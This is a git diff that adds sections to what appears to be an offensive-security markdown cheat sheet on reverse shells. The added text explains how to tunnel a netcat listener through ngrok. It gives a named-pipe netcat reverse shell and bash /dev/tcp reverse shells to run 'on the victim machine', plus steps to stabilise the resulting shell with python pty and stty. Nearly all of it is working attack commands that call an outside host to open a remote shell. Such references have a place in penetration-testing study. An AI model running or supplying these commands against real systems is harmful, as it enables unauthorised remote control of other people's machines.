@@ -826,6 +826,49 @@ shell.sh:
 
 4. The attacker runs a command in the first window on theattacker’s system. The target system reads the commands,executes it locally, and it returns the result to the second window of the attacker
 
+## NGROK
+
+### METHOD 1
+prerequisites: Install ngrok from the [site](https://ngrok.com/) and authenticate is + Netcat installed
+
+1. Open a netcat listener on local machine
+    > nc -lvp 4444
+2. Expose the port to the internet using ngrok, in another terminal
+    > ngrok tcp 4444
+    > 
+    > look for the output:
+    >> Forwarding       \t\t    tcp://4.tcp.eu.ngrok.io:[PORT] -> localhost:4444
+
+3. on the victim machine run `cat /tmp/f|sh -i 2>&1|nc [ngrok-host] [ngrok-port] > /tmp/f`
+
+### Living Off The Land
+
+1. take the IP addreess of the ngrok endpoint resolving the hostname:
+    > nslookup 4.tcp.eu.ngrok.io
+
+2. use that IP address in the netcat command on the remote machine:
+    > bash -i >& /dev/tcp/[NGROK-IP]/[NGROK-PORT] 0>&1
+    > 
+    > or, if we are out of a bash environment:
+    >> bash -c "bash -i >& /dev/tcp/[NGROK-IP]/[NGROK-PORT] 0>&1"
+
+## SHELL STABILIZATION
+
+in order to use job control commands (with CTRL), reset TERM, line editing, ecc...
+
+After connecting the shell, if ***python*** is available on the victim machine:
+
+> python3 -c 'import pty;pty.spawn("/bin/bash")'; export TERM=xterm
+
+Then press CTRL+Z to background the actual terminal and return to the local terminal. Then write:
+
+> stty raw -echo; fg
+
+This last line disables line buffering and special character interpretation, disables character echoing and configures the local terminal to pass input directly to the remote shell.
+
+
+
+
 <br>
 <br>
 
